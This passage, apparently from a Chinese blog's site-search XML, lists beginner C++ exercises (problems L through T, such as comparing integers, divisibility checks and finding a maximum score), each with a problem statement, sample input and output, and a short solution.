cout &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-L-编程达人"><a href="#题目名称-L-编程达人" class="headerlink" title="题目名称:L-编程达人"></a>题目名称:L-编程达人</h2><h3 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h3><p>ReRe努力学习编程，请编程帮她判断学习情况。 		</p>
<h3 id="输入描述-11"><a href="#输入描述-11" class="headerlink" title="输入描述:"></a>输入描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一个整数表示2个小时完成编程的题目数目。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-11"><a href="#输出描述-11" class="headerlink" title="输出描述:"></a>输出描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据2个小时完成编程的题目数目，若大于等于10道，输出“Super programmer!”，否则输出“Come on!”                    </span><br></pre></td></tr></table></figure>

<h3 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20</span><br></pre></td></tr></table></figure>

<h3 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Super programmer!</span><br></pre></td></tr></table></figure>

<h3 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="comment">// 读取题目数目</span></span><br><span class="line">    cin &gt;&gt; num;</span><br><span class="line">    <span class="comment">// 判断学习情况并输出</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Super programmer!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Come on!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-M-比大小"><a href="#题目名称-M-比大小" class="headerlink" title="题目名称:M-比大小"></a>题目名称:M-比大小</h2><h3 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h3><p>  比较整数a和整数b的大小。 </p>
<h3 id="输入描述-12"><a href="#输入描述-12" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一行两个整数，由空格隔开，分别代表整数a、b的值</span><br><span class="line">(1&lt;=a,b&lt;=10000)</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-12"><a href="#输出描述-12" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若a比b小，输出&quot;&lt;&quot;</span><br><span class="line">若a与b相等，输出&quot;=&quot;</span><br><span class="line"></span><br><span class="line">若a比b大，输出&quot;&gt;&quot;</span><br><span class="line">实际输出中，不包含双引号       </span><br></pre></td></tr></table></figure>

<h3 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 2</span><br></pre></td></tr></table></figure>

<h3 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;</span><br></pre></td></tr></table></figure>

<h3 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="comment">// 读取两个整数</span></span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="comment">// 比较大小并输出结果</span></span><br><span class="line">    <span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&lt;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == b) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;=&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&gt;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-N-牛妹数"><a href="#题目名称-N-牛妹数" class="headerlink" title="题目名称:N-牛妹数"></a>题目名称:N-牛妹数</h2><h3 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h3><p>  如果一个数是一个偶数而且大于50,我们称它为牛妹数 </p>
<p>  给你一个数,判断它是否是牛妹数 </p>
<h3 id="输入描述-13"><a href="#输入描述-13" class="headerlink" title="输入描述:"></a>输入描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一个整数n (1 &lt;= n &lt;= 100)</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-13"><a href="#输出描述-13" class="headerlink" title="输出描述:"></a>输出描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果是牛妹数,输出&quot;yes&quot;, 否则输出&quot;no&quot;                  </span><br></pre></td></tr></table></figure>

<h3 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50</span><br></pre></td></tr></table></figure>

<h3 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">no</span><br></pre></td></tr></table></figure>

<h3 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 读取整数</span></span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">// 判断是否是牛妹数</span></span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">0</span> &amp;&amp; n &gt; <span class="number">50</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-O-判断一个数能否同时被3和5整除"><a href="#题目名称-O-判断一个数能否同时被3和5整除" class="headerlink" title="题目名称:O-判断一个数能否同时被3和5整除"></a>题目名称:O-判断一个数能否同时被3和5整除</h2><h3 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h3><p>判断一个数n 能否同时被3和5整除，如果能同时被3和5整除输出YES，否则输出NO。 </p>
<h3 id="输入描述-14"><a href="#输入描述-14" class="headerlink" title="输入描述:"></a>输入描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一行，包含一个整数n。（ -1,000,000 &lt; n &lt; 1,000,000）</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-14"><a href="#输出描述-14" class="headerlink" title="输出描述:"></a>输出描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一行，包含一个整数n。（ -1,000,000 &lt; n &lt; 1,000,000）                 </span><br></pre></td></tr></table></figure>

<h3 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure>

<h3 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YES</span><br></pre></td></tr></table></figure>

<h3 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 读取整数</span></span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">// 判断是否能同时被3和5整除</span></span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">0</span> &amp;&amp; n % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-P-判断字母"><a href="#题目名称-P-判断字母" class="headerlink" title="题目名称:P-判断字母"></a>题目名称:P-判断字母</h2><h3 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h3><p>从键盘任意输入一个字符，编程判断是否是字母（包括大小写）。</p>
<h3 id="输入描述-15"><a href="#输入描述-15" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入包括一个字符。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-15"><a href="#输出描述-15" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出该字符是字母（YES）或不是（NO）。           </span><br></pre></td></tr></table></figure>

<h3 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">H</span><br></pre></td></tr></table></figure>

<h3 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YES</span><br></pre></td></tr></table></figure>

<h3 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="comment">// 读取字符</span></span><br><span class="line">    cin &gt;&gt; ch;</span><br><span class="line">    <span class="comment">// 判断是否是字母</span></span><br><span class="line">    <span class="keyword">if</span> ((ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) || (ch &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-Q-KiKi的最高分"><a href="#题目名称-Q-KiKi的最高分" class="headerlink" title="题目名称:Q-KiKi的最高分"></a>题目名称:Q-KiKi的最高分</h2><h3 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h3><p>KiKi知道了大一三科比较重要课程的分数，包括：程序设计基础，高数，英语，请编程帮他找到三科中的最高分。</p>
<h3 id="输入描述-16"><a href="#输入描述-16" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，三个整数，用空格分隔，代表三科成绩。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-16"><a href="#输出描述-16" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，一个整数，代表输入三科分数中的最高分数。               </span><br></pre></td></tr></table></figure>

<h3 id="输入-16"><a href="#输入-16" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">90 88 99</span><br></pre></td></tr></table></figure>

<h2 id="输出-16"><a href="#输出-16" class="headerlink" title="输出"></a>输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">99</span><br></pre></td></tr></table></figure>

<h3 id="代码-16"><a href="#代码-16" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> score1, score2, score3;</span><br><span class="line">    <span class="comment">// 读取三科成绩</span></span><br><span class="line">    cin &gt;&gt; score1 &gt;&gt; score2 &gt;&gt; score3;</span><br><span class="line">    <span class="comment">// 找到最高分数</span></span><br><span class="line">    <span class="type">int</span> maxScore = <span class="built_in">max</span>(<span class="built_in">max</span>(score1, score2), score3);</span><br><span class="line">    <span class="comment">// 输出最高分数</span></span><br><span class="line">    cout &lt;&lt; maxScore &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-R-判断输出"><a href="#题目名称-R-判断输出" class="headerlink" title="题目名称:R-判断输出"></a>题目名称:R-判断输出</h2><h3 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入一个正整数，如果小于等于10就把这个整数输出。</p>
<h3 id="输入描述-17"><a href="#输入描述-17" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个整数(1~1000)</span><br></pre></td></tr></table></figure>

<h2 id="输出描述-17"><a href="#输出描述-17" class="headerlink" title="输出描述"></a>输出描述</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果小于等于10就把这个整数输出。                </span><br></pre></td></tr></table></figure>

<h3 id="输入-17"><a href="#输入-17" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<h2 id="输出-17"><a href="#输出-17" class="headerlink" title="输出"></a>输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<h3 id="代码-17"><a href="#代码-17" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="comment">// 读取输入整数</span></span><br><span class="line">    cin &gt;&gt; num;</span><br><span class="line">    <span class="comment">// 如果小于等于10，就输出</span></span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">        cout &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-S-计算y的值"><a href="#题目名称-S-计算y的值" class="headerlink" title="题目名称:S-计算y的值"></a>题目名称:S-计算y的值</h2><h3 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h3><p>  已知一个函数y&#x3D;f(x)，当x &lt; 0时，y &#x3D; 1；当x &#x3D; 0时，y &#x3D; 0；当x &gt; 0时，y &#x3D; -1。  </p>
<h3 id="输入描述-18"><a href="#输入描述-18" class="headerlink" title="输入描述:"></a>输入描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，输入一个整数x。（-10000&lt;x&lt;10000）</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-18"><a href="#输出描述-18" class="headerlink" title="输出描述:"></a>输出描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，输出y的值。                        </span><br></pre></td></tr></table></figure>

<h3 id="输入-18"><a href="#输入-18" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure>

<h3 id="输出-18"><a href="#输出-18" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1</span><br></pre></td></tr></table></figure>

<h3 id="代码-18"><a href="#代码-18" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="comment">// 读取输入整数</span></span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    <span class="comment">// 根据题目条件计算并输出y的值</span></span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        y = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">        y = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-T-有一门课不及格的学生"><a href="#题目名称-T-有一门课不及格的学生" class="headerlink" title="题目名称:T-有一门课不及格的学生"></a>题目名称:T-有一门课不及格的学生</h2><h3 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h3><p>​		给出一名学生的语文和数学成绩，判断他是否恰好有一门课不及格(成绩小于60分)。若该生恰好有一门课不及格，输出1；否则输出0。 </p>
<h3 id="输入描述-19"><a href="#输入描述-19" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，包含两个在0到100之间的整数，分别是该生的语文成绩和数学成绩。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-19"><a href="#输出描述-19" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若该生恰好有一门课不及格，输出1；否则输出0。               </span><br></pre></td></tr></table></figure>

<h3 id="输入-19"><a href="#输入-19" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 80</span><br></pre></td></tr></table></figure>

<h3 id="输出-19"><a href="#输出-19" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>

<h3 id="代码-19"><a href="#代码-19" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> chinese, math;</span><br><span class="line">    <span class="comment">// 读取输入的语文和数学成绩</span></span><br><span class="line">    cin &gt;&gt; chinese &gt;&gt; math;</span><br><span class="line">    <span class="comment">// 判断是否恰好有一门课不及格</span></span><br><span class="line">    <span class="keyword">if</span> ((chinese &lt; <span class="number">60</span> &amp;&amp; math &gt;= <span class="number">60</span>) || (chinese &gt;= <span class="number">60</span> &amp;&amp; math &lt; <span class="number">60</span>)) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;0&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>程序设计基础习题</category>
      </categories>
      <tags>
        <tag>程序设计基础</tag>
      </tags>
  </entry>
</search>
